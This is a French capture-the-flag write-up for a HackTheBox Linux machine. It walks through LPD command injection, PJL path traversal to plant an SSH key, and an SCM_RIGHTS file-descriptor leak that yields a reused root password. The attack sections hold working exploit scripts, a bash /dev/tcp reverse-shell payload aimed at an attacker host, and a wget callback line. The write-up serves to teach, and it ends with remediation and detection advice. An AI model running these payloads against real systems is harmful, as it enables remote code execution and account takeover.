
# Writeup complet — HackTheBox : Paperwork

> **Catégorie :** Linux · **Difficulté :** Easy · **Saison 11**
> **Thèmes :** LPD · PJL · JetDirect · SCM_RIGHTS
> **Auteur :** Mouhamed Lo

---

## Sommaire

1. [Résumé (TL;DR)](#résumé-tldr)
2. [La chaîne en une phrase](#la-chaîne-en-une-phrase)
3. [Vocabulaire indispensable (glossaire)](#vocabulaire-indispensable-glossaire)
4. [Étape 0 — Reconnaissance](#étape-0--reconnaissance)
5. [Étape 1 — Foothold : injection de commande LPD → `lp`](#étape-1--foothold--injection-de-commande-lpd--lp)
6. [Étape 2 — Énumération interne depuis `lp`](#étape-2--énumération-interne-depuis-lp)
7. [Étape 3 — PJL : lecture de fichier arbitraire (user.txt)](#étape-3--pjl--lecture-de-fichier-arbitraire-usertxt)
8. [Étape 4 — PJL : écriture arbitraire → clé SSH → `archivist`](#étape-4--pjl--écriture-arbitraire--clé-ssh--archivist)
9. [Étape 5 — SCM_RIGHTS : fuite de descripteur → mot de passe admin → `root`](#étape-5--scm_rights--fuite-de-descripteur--mot-de-passe-admin--root)
10. [Les pièges rencontrés (vécu réel)](#les-pièges-rencontrés-vécu-réel)
11. [Remédiation (côté défense)](#remédiation-côté-défense)
12. [Leçons à retenir](#leçons-à-retenir)

---

## Résumé (TL;DR)

Une machine Linux construite autour de **services d'impression maison** volontairement vulnérables. Pas de faille exotique unique : **quatre erreurs de conception sérieuses**, chaînées à travers quatre frontières de confiance.

- Une **injection de commande** dans un service LPD artisanal donne un shell en tant que `lp`.
- Un service **JetDirect/PJL** interne, tournant en tant qu'`archivist`, permet la **lecture et l'écriture de fichiers arbitraires** par *path traversal* → injection d'une clé SSH.
- Un **daemon root** passe un descripteur de fichier déjà ouvert à un client non privilégié via **SCM_RIGHTS**, révélant un mot de passe administrateur que le compte root accepte aussi.

---

## La chaîne en une phrase

```
Injection de commande LPD (TCP 1515) → shell lp
  → service PJL interne (127.0.0.1:9100) → lecture puis écriture par traversal
    → clé SSH dans authorized_keys → connexion SSH en archivist
      → connexion à /run/paperwork/mgmt.sock → réception d'un descripteur root via SCM_RIGHTS
        → récupération du mot de passe admin réutilisé → su → root
```

---

## Vocabulaire indispensable (glossaire)

Avant les étapes, voici **tous les termes** utilisés, expliqués simplement.

- **LPD (Line Printer Daemon)** : vieux protocole réseau d'impression (RFC 1179), historiquement sur le port TCP 515. Un client envoie un « job » (un travail d'impression) à une « queue » (file d'attente nommée).
- **PJL (Printer Job Language)** : langage de commande des imprimantes HP. Au‑delà d'imprimer, il peut souvent **lire et écrire des fichiers** sur l'imprimante (commandes `FSUPLOAD`, `FSDOWNLOAD`, `FSDIRLIST`…). C'est ce qui le rend dangereux quand il est mal implémenté.
- **JetDirect** : le nom des serveurs d'impression réseau HP ; le port brut **9100** reçoit directement des données/commandes d'impression.
- **UEL (Universal Exit Language)** : la séquence d'octets `\x1b%-12345X` qui ouvre et ferme un bloc de commandes PJL. `\x1b` est le caractère ESC.
- **FSUPLOAD** : commande PJL qui **lit** un fichier depuis l'imprimante (upload = de l'imprimante vers le client).
- **FSDOWNLOAD** : commande PJL qui **écrit** un fichier sur l'imprimante (download = du client vers l'imprimante). C'est une écriture de fichier à distance.
- **Path traversal (remontée de répertoire)** : abuser de `../` dans un chemin pour sortir du dossier prévu et atteindre d'autres fichiers du système (ex. `0:/../../../etc/passwd`).
- **Injection de commande (command injection)** : faire exécuter sa propre commande système en glissant des métacaractères shell (`;`, `|`, `` ` ``, `$()`) dans une entrée qui finit dans un shell.
- **`shell=True`** : en Python, option de `subprocess` qui fait passer la commande par un shell → interprète les métacaractères → terrain d'injection.
- **Reverse shell (shell inversé)** : la cible se connecte **vers l'attaquant** et lui donne un shell. Pratique quand on ne peut pas se connecter directement à la cible.
- **Listener** : un programme (souvent `nc -lvnp <port>`) qui attend la connexion retour du reverse shell.
- **tun0** : l'interface réseau du VPN HackTheBox. Son IP (`10.10.x.x`) est l'adresse que la cible peut joindre — c'est celle à utiliser comme `LHOST`.
- **File descriptor (descripteur de fichier, fd)** : un entier qui représente un fichier déjà ouvert par un processus. Le noyau associe ce numéro à un accès ouvert.
- **SCM_RIGHTS** : mécanisme Unix qui permet de **passer un descripteur de fichier ouvert** d'un processus à un autre via une socket Unix. Le receveur hérite de **l'accès déjà ouvert**, sans jamais avoir besoin de permission sur le chemin du fichier. C'est la faille d'architecture clé ici.
- **Socket Unix** : un canal de communication local entre processus (un fichier spécial, ici `/run/paperwork/mgmt.sock`).
- **`recvmsg` / `sendmsg`** : fonctions socket capables de transporter des **données auxiliaires** (ancillary data), dont les descripteurs passés par SCM_RIGHTS.
- **`Recv-Q` (dans `ss`)** : pour une socket en écoute, le nombre de connexions en attente d'être acceptées. S'il grimpe, le service est engorgé/bloqué.
- **`CLOSE-WAIT`** : état TCP où le client a fermé sa moitié de connexion mais le serveur ne l'a pas (encore) fermée — signe que le serveur est bloqué et ne traite plus.
- **`su -`** : « substitute user », passer à un autre utilisateur (par défaut root) en fournissant son mot de passe.

---

## Étape 0 — Reconnaissance

On cartographie les ports ouverts, puis on détaille les services.

```bash
# Tous les ports, en vitesse
nmap -Pn -p- --min-rate 5000 -oA scans/all-ports <IP_CIBLE>

# Détail des services trouvés
nmap -Pn -sC -sV -p22,80,1515 -oA scans/services <IP_CIBLE>
```

**Explication des options :**
- `-Pn` : ne pas faire de ping préalable (la cible peut bloquer l'ICMP).
- `-p-` : scanner les 65535 ports.
- `--min-rate 5000` : envoyer au moins 5000 paquets/s (plus rapide).
- `-sC` : scripts de détection par défaut. `-sV` : détection de version.
- `-oA` : sauvegarder la sortie dans les trois formats.

**Résultat :** SSH (22), HTTP (80), et un service LPD maison sur **TCP 1515**. La revue du code source du service LPD (récupérable via le web/les fichiers) est bien plus utile qu'un scanner ici.

Le code vulnérable du serveur LPD :

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(
    f"echo 'Archive: {job_name}' >> /tmp/archive.log",
    shell=True
)
```

**Pourquoi c'est vulnérable :** le `job_name` vient du client (la ligne qui commence par `J` dans le fichier de contrôle du job). Il est **inséré tel quel** dans une commande shell exécutée avec `shell=True`. Une apostrophe ferme la chaîne prévue, et tout ce qui suit devient du shell.

---

## Étape 1 — Foothold : injection de commande LPD → `lp`

On façonne le `job_name` pour que le `echo` reste syntaxiquement valide tout en injectant notre commande :

```
Jx'; bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'; echo 'x
```

Une fois injecté, la ligne assemblée côté serveur devient :

```bash
echo 'Archive: x'; \
bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'; \
echo 'x' >> /tmp/archive.log
```

**Détail crucial :** la commande injectée est exécutée par `/bin/sh` (souvent **dash**). Or `>&` et `0>&1` sont de la syntaxe **bash**, que dash ne comprend pas. D'où l'enveloppe **`bash -c '...'`** : on force bash à interpréter la redirection. (C'est précisément le point qui faisait échouer un simple `bash -i >& /dev/tcp/...`.)

**Le script client** parle le protocole LPD dans le bon ordre. Points clés : le premier octet est la commande (`\x02` = « receive print job »), la file peut être contournée (une chaîne vide est « contenue » dans n'importe quelle file), puis un sous‑bloc annonce la taille et le contenu contenant la ligne `J` :

```python
import socket, time

TARGET_IP   = "<IP_CIBLE>"
TARGET_PORT = 1515
LHOST       = "<IP_tun0>"   # votre IP VPN (PAS l'IP locale de Kali)
LPORT       = 4444

payload = f"x'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ; echo '"
content = f"J{payload}\n".encode()
size = len(content)

s = socket.socket(); s.connect((TARGET_IP, TARGET_PORT))
s.send(b"\x02\n")                                  # commande 2 + file vide
time.sleep(0.5)
s.send(b"\x02 " + str(size).encode() + b" dfA\n")  # sous-bloc : taille
time.sleep(0.5)
s.recv(1024)                                       # ACK \x00 du serveur
s.send(content)                                    # la charge (ligne J)
time.sleep(1); s.close()
```

**Les `time.sleep` sont importants** : sans eux, TCP peut livrer les envois collés, et le serveur lit de travers (il rejetterait la file).

On lance le listener, puis le script :

```bash
nc -lvnp 4444
python3 exploit.py
# -> uid=7(lp) gid=7(lp) groups=7(lp)
```

On stabilise le shell (sinon les éditeurs et `cat` cassent la session) :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

> **Vulnérabilité F‑01 — Injection de commande (Critique, CWE‑78).** Métadonnée de job interpolée dans un shell avec `shell=True` → RCE en `lp`.

---

## Étape 2 — Énumération interne depuis `lp`

On cherche les comptes humains et les services internes.

```bash
# Comptes avec un vrai shell
cat /etc/passwd | grep -E '/bin/(bash|sh)$'
# root:x:0:0:root:/root:/bin/bash
# archivist:x:1000:1000:archivist:/home/archivist:/bin/bash

# Le code du service qu'on a exploité
find /opt/LPDServer -maxdepth 3 -type f -ls 2>/dev/null

# Tous les processus
ps auxww

# Les ports en écoute, avec le processus propriétaire
ss -lntp
```

Points clés révélés :

```
# Un second service d'impression, en tant qu'archivist :
archivist ... /usr/bin/python3 /home/archivist/printer/jetdirect.py \
    9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log

# Et il n'écoute qu'en local :
127.0.0.1:9100
```

Deux détails font toute la suite :
1. Le service tourne en **`archivist`** (un compte interactif) → toute opération de fichier hérite de ses droits.
2. Son dossier de base est `/home/archivist/printer/`, **un niveau sous `~/.ssh`**. Sortir de la base par traversal atterrit à un endroit très utile.

> **Pas de `sudo` sur la machine** (`Command 'sudo' not found`) → l'escalade se fera par la lecture de code et les services, pas par les droits sudo.

---

## Étape 3 — PJL : lecture de fichier arbitraire (user.txt)

Le service `jetdirect.py` parle les commandes « filesystem » du PJL. Le **cadrage exact** compte : `\x1b%-12345X\r\n` avant et après, et le volume `0:`.

D'abord, vérifier la santé du service (voir les pièges plus bas) :

```bash
ss -lnt | grep 9100
# sain = LISTEN 0 100 127.0.0.1:9100  (Recv-Q à 0)
```

Lire `user.txt` — base `/home/archivist/printer/` + `../user.txt` = `/home/archivist/user.txt` :

```python
import socket
s = socket.create_connection(("127.0.0.1", 9100), 5); s.settimeout(8)
s.sendall(b'\x1b%-12345X\r\n@PJL FSUPLOAD NAME="0:/../user.txt" OFFSET=0 SIZE=4096\r\n\x1b%-12345X\r\n')
print(s.recv(8192).decode(errors="replace"))
s.close()
```

Réponse :

```
@PJL FSUPLOAD NAME="0:/../user.txt" SIZE=33
bde6eaea82f98c3553b5739ddfb035c9
```

➡️ **user.txt = `bde6eaea82f98c3553b5739ddfb035c9`**

(On peut aussi lire `/etc/passwd` avec `NAME="0:/../../../etc/passwd"` pour confirmer le traversal.)

> **Vulnérabilité F‑02 — Path traversal PJL, lecture ET écriture (Critique, CWE‑22).** Le chemin PJL est joint à la base sans canonicalisation → lecture/écriture arbitraire en `archivist`.

---

## Étape 4 — PJL : écriture arbitraire → clé SSH → `archivist`

On génère une paire de clés SSH côté attaquant :

```bash
ssh-keygen -t ed25519 -f ./archivist_key -N ''
cat archivist_key.pub
```

On écrit la clé publique dans `authorized_keys` d'`archivist`. Cible : `0:/../.ssh/authorized_keys` (base + `../.ssh/...` = `/home/archivist/.ssh/authorized_keys`).

**Le détail qui coûte du temps :** ce serveur maison attend l'**en‑tête `FSDOWNLOAD`** et les **octets du fichier** en **deux lectures socket séparées**. Les envoyer d'un seul coup produit un fichier de **0 octet, sans erreur**.

```python
import socket, time

public_key = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... attacker@kali\n"

s = socket.create_connection(("127.0.0.1", 9100), 5)
header = (
    b"\x1b%-12345X\r\n"
    b'@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE='
    + str(len(public_key)).encode()
    + b"\r\n"
)
s.sendall(header)        # 1er envoi : l'en-tête
time.sleep(0.5)
s.sendall(public_key)    # 2e envoi SÉPARÉ : les octets — c'est LE point clé
time.sleep(0.5)
s.close()
```

Vérifier avec `FSUPLOAD`, puis se connecter :

```bash
# (relecture de contrôle)
# @PJL FSUPLOAD NAME="0:/../.ssh/authorized_keys" ...

ssh -i ./archivist_key archivist@<IP_CIBLE>
# uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
cat user.txt
```

On a maintenant un **vrai shell stable** en `archivist` (fini le reverse shell fragile).

> **Vulnérabilité F‑03 — Service d'impression tournant sous un utilisateur interactif (Élevée).** `jetdirect` en `archivist` peut modifier le `~/.ssh` de cet utilisateur → compromission directe du compte.

---

## Étape 5 — SCM_RIGHTS : fuite de descripteur → mot de passe admin → `root`

Pas de `sudo` → retour à la lecture de code. Le daemon root est **lisible par tous** :

```bash
ls -l /usr/bin/paperwork-daemon
# -rw-r--r-- 1 root root 2103 ... /usr/bin/paperwork-daemon
cat /usr/bin/paperwork-daemon
```

Son code (essentiel) :

```python
# Ouvert AU DÉMARRAGE, en tant que root, et gardé ouvert :
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    # ... puis il zippe le log et le VIDE (truncate 0)

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)   # groupe 1000 = archivist
    s.listen(5)
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)   # <-- nous envoie admin_fd !
        else:
            ...  # STATUS: SYSTEM_CLEAN
        conn.close()
```

**L'erreur d'architecture :** `SCM_RIGHTS` transmet l'**accès à la description de fichier déjà ouverte**, pas un chemin. Le processus receveur n'a **jamais** besoin de permission sur `/etc/paperwork/admin_pins.conf` — le descripteur est déjà ouvert, et il a été ouvert **par root**. Les permissions du chemin ne comptent tout simplement pas.

Comme le socket appartient au **groupe 1000 (archivist)**, on peut s'y connecter. Et si `commands.log` contient un verbe PJL filesystem (ce que nos opérations précédentes ont écrit), on tombe directement dans la branche « lockdown » qui nous donne les descripteurs.

⚠️ **Attention :** `trigger_lockdown` **vide le log ensuite**. On n'a donc qu'un tir par empoisonnement. Comme on est `archivist` et qu'on possède le log, on le ré‑empoisonne par sécurité.

Exploitation (dans la session **`archivist`**) :

```bash
# 1. (ré)injecter un déclencheur dans le log
echo "FSUPLOAD" >> ~/printer/logs/commands.log

# 2. recevoir le descripteur root et le lire
cat > ~/r.py << 'EOF'
import socket, array, os
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, ancdata, flags, addr = s.recvmsg(
    4096, socket.CMSG_SPACE(2 * array.array("i").itemsize))
print("MSG:", msg.decode(errors="replace"))
for level, kind, data in ancdata:
    if level == socket.SOL_SOCKET and kind == socket.SCM_RIGHTS:
        fds = array.array("i")
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])
        for fd in fds:
            print(os.pread(fd, 1024, 0).decode(errors="replace"))
            os.close(fd)
s.close()
EOF
python3 ~/r.py
```

Sortie :

```
MSG: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
----
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

**Explication du script :**
- `recvmsg(..., CMSG_SPACE(2 * itemsize))` : réserve la place pour **2 descripteurs** (log_fd + admin_fd) dans les données auxiliaires.
- `SCM_RIGHTS` : on récupère les fd transmis.
- `os.pread(fd, 1024, 0)` : lit 1024 octets du descripteur à l'offset 0 — **sans l'ouvrir nous‑mêmes**.

Le mot de passe admin est **réutilisé par le compte root** :

```bash
su -
# mot de passe : ApparelMortuaryCedar22
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

➡️ **root.txt = `<à compléter avec votre valeur>`**

> **Vulnérabilité F‑04 — Descripteur privilégié divulgué via SCM_RIGHTS (Critique, CWE‑402).** Le daemon root inclut un descripteur root ouvert vers un fichier protégé dans un message à un client non privilégié.
>
> **Vulnérabilité F‑05 — Mot de passe admin réutilisé par root (Critique).** Un secret applicatif accepté par `su` → compromission totale.

---

## Les pièges rencontrés (vécu réel)

Ces détails ne sont pas dans la théorie mais font la différence :

1. **Le reverse shell `bash /dev/tcp` échoue sous dash.** Solution : envelopper dans `bash -c '...'`. On diagnostique avec un **rappel HTTP** : charge `wget http://<tun0>:8000/HIT` + un `python3 -m http.server 8000` chez soi ; si le `GET` arrive, l'injection marche et la cible nous joint — on sait alors que seul le *type* de shell est en cause.

2. **Le service PJL est fragile et single‑thread.** Le fuzzer (plusieurs connexions rapides, requêtes malformées) l'**engorge** : `ss -lnt | grep 9100` montre un `Recv-Q` élevé (ex. 20) et une pile de `CLOSE-WAIT`. Règle d'or : **une connexion courte à la fois**, et on vérifie `Recv-Q = 0` entre chaque requête.

3. **Débloquer un service engorgé sans reset.** Nos propres clients python restés `ESTAB` bloquaient le serveur. On les identifie et on les tue :
   ```bash
   ss -tnp | grep ':9100'     # repérer les PID de nos clients
   kill -9 <PID1> <PID2>      # surtout PAS pkill python3 (ça tue le shell pty)
   ss -lnt | grep 9100        # Recv-Q doit retomber à 0
   ```

4. **FSDOWNLOAD : en‑tête et données en deux `sendall` séparés**, sinon fichier de 0 octet.

5. **Le bon utilisateur pour chaque action.** La socket `mgmt.sock` est groupe `archivist` → l'exploit SCM_RIGHTS **doit** tourner en `archivist`, pas en `lp`. Et `/tmp/root.py` créé par `lp` n'est pas réécrasable par `archivist` → écrire sous `~/r.py`.

---

## Remédiation (côté défense)

| # | Faille | Correction |
|---|---|---|
| F‑01 | Injection de commande LPD | Ne pas utiliser de shell : écrire le log avec les API fichier de Python ; sinon `subprocess` avec liste d'arguments et `shell=False`. Traiter toute métadonnée comme hostile. |
| F‑02 | Path traversal PJL (lecture/écriture) | **Canonicaliser d'abord, vérifier ensuite** : `Path.resolve()` puis rejeter tout ce qui sort de la racine autorisée. Filtrer `../` ≠ containment. Désactiver les commandes filesystem PJL si inutiles. |
| F‑03 | Service en utilisateur interactif | Compte dédié non‑login, sandbox systemd (`ProtectHome=true`, `ProtectSystem=strict`, `NoNewPrivileges=true`, `ReadWritePaths=` explicite). |
| F‑04 | Descripteur privilégié via SCM_RIGHTS | Ne jamais passer de descripteur privilégié non lié. Authentifier le client de la socket (`SO_PEERCRED`). Ouvrir‑lire‑fermer : ne pas garder de descripteur de secret ouvert. |
| F‑05 | Mot de passe admin réutilisé par root | Secrets uniques et aléatoires par service, dans un gestionnaire de secrets. Désactiver le login root par mot de passe. |

**Références utiles :** NIST SP 800‑53 r5 (SI‑10, CM‑7, AC‑6, AC‑3, SC‑4, IA‑5), CIS Benchmarks, DISA STIG, Ubuntu Security Guide.

**Côté détection (blue team) :** champs de fichier de contrôle LPD avec métacaractères shell ; connexions sortantes initiées par le compte `lp` ; requêtes PJL `FSUPLOAD`/`FSDOWNLOAD`/`FSQUERY` contenant `../` ; écriture dans `/home/*/.ssh/authorized_keys` par un processus d'impression ; connexions inattendues à `/run/paperwork/mgmt.sock` ; `su` vers root juste après l'accès à un fichier de secret.

---

## Leçons à retenir

- **Lire le code bat le scanner.** Chaque étape ici vient de code laissé lisible.
- **« Lié à localhost » décrit la position réseau, pas le modèle de sécurité.** Un service interne a quand même besoin de vraies frontières de confiance.
- **Les restrictions de chemin doivent s'appliquer après résolution canonique.** Un simple préfixe de dossier n'est pas du containment.
- **Le passage de descripteur Unix contourne les permissions de chemin par conception.** C'est l'idée la plus transférable de cette box.
- **Les petits détails d'implémentation décident du succès.** En‑tête et données en deux envois séparés : la différence entre une clé et un fichier vide.
- **La séparation des identifiants** aurait brisé la chaîne à la dernière étape — le contrôle le moins cher.

---

### Chaîne finale

| Phase | Technique | Résultat |
|---|---|---|
| Foothold | Injection de commande LPD (TCP 1515) | shell `lp` |
| User | Traversal PJL → écriture `authorized_keys` → SSH | `archivist` + `user.txt` |
| Root | Fuite de descripteur SCM_RIGHTS → mot de passe réutilisé → `su` | `root` + `root.txt` |

**Compétences mises en œuvre :** reconnaissance réseau, lecture et compréhension de code, exploitation de protocoles (LPD, PJL), injection de commande, path traversal, post‑exploitation, exploitation d'IPC Unix (SCM_RIGHTS), diagnostic de services instables.
